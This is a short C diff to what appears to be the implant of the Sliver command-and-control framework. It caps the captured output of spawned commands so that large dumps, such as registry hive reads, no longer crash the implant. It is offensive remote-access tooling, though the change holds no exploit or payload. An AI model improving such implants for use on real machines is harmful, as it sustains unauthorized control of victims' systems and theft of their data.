@@ -62,11 +62,28 @@ static BOOL spawn_with_std_handles(const char *exe, char *cmdline, HANDLE in, HA
   return ok;
 }
 
+/* Captured output is capped: a huge child (dir /s, read-hive style dumps) used to
+ * grow the buffer without bound and take the implant down when the RPC payload
+ * could not be framed (8 MiB limit). */
+#define SLIVER_EXEC_CAPTURE_LIMIT (1024u * 1024u)
+
+static int capture_append(sliver_buf_t *out, const char *buf, DWORD got) {
+  if (out->len >= SLIVER_EXEC_CAPTURE_LIMIT) {
+    return 0;
+  }
+  if (out->len + got > SLIVER_EXEC_CAPTURE_LIMIT) {
+    got = (DWORD)(SLIVER_EXEC_CAPTURE_LIMIT - out->len);
+  }
+  return sliver_buf_append(out, buf, got);
+}
+
 static void drain(HANDLE h, sliver_buf_t *out) {
   char buf[4096];
   DWORD got = 0;
   while (ReadFile(h, buf, sizeof(buf), &got, NULL) && got > 0) {
-    (void)sliver_buf_append(out, buf, got);
+    if (capture_append(out, buf, got) != 0) {
+      break;
+    }
   }
 }
 
@@ -82,7 +99,9 @@ static void drain_available(HANDLE h, sliver_buf_t *out) {
     if (!ReadFile(h, buf, sizeof(buf), &got, NULL) || got == 0) {
       return;
     }
-    (void)sliver_buf_append(out, buf, got);
+    if (capture_append(out, buf, got) != 0) {
+      return;
+    }
   }
 }
 
@@ -371,6 +390,7 @@ void sliver_child_free(sliver_child_t *c) {
   }
   free(c);
 }
+
 
 
 
